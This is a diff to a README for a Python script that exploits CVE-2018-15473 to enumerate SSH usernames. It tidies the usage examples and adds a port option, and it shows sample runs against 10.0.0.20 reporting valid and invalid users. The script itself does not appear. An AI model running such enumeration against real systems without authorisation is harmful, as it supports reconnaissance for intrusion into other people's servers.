@@ -11,7 +11,12 @@ I will place the fixed file on this repo.<br />
 
 The purpose of this script is to use a recent vulnerability, CVE-2018-15473, to enumerate users on a system through ssh.<br />
 Usage:<br />
-root@kali:/media/veracrypt1/2_linux/9F18c/scripts/python# python ssh-check-username.py 10.0.0.20 bob<br />
+./ssh-check-username.py 10.0.0.20 bob<br />
 [*] Invalid username<br />
-root@kali:/media/veracrypt1/2_linux/9F18c/scripts/python# python ssh-check-username.py 10.0.0.20 root<br />
+./ssh-check-username.py 10.0.0.20 root<br />
 [+] Valid username<br />
+
+You can optionally specify the port to use:<br />
+./ssh-check-username.py 10.0.0.20 --port 22 root<br />
+[+] Valid username
+
